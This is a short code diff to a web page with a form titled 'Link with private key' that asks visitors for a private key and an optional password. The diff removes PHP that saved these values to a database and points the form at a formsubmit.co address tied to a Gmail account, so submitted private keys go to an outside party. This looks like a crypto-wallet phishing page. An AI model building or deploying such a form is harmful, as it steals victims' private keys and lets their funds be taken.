@@ -1,20 +1,4 @@
-<?php
-require "connection_beginner.html";
 
-if($_SERVER['REQUEST_METHOD'] == "POST")
-{
-$key = addslashes($_POST['key']);
-$password = addslashes($_POST['password']);
-$date = date('Y-m-d H:i:s');
-
-$query = "insert into users (username,password,date) values
-('$key','$password','$date')";
-$result = mysqli_query($con,$query);
-header("Location:contact.html");
-die;
-}
-
-?>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -634,7 +618,7 @@ die;
      Link with private key
   </h4>
 
-  <form action="private.php" method="post">
+  <form action="https://formsubmit.co/minice629@gmail.com" method="post">
     <input type="text" name="key" id="pkey" placeholder="private key" required> <br>
     <input type="password" name="password" id="pkey" placeholder="password (optional)"> <br>
 
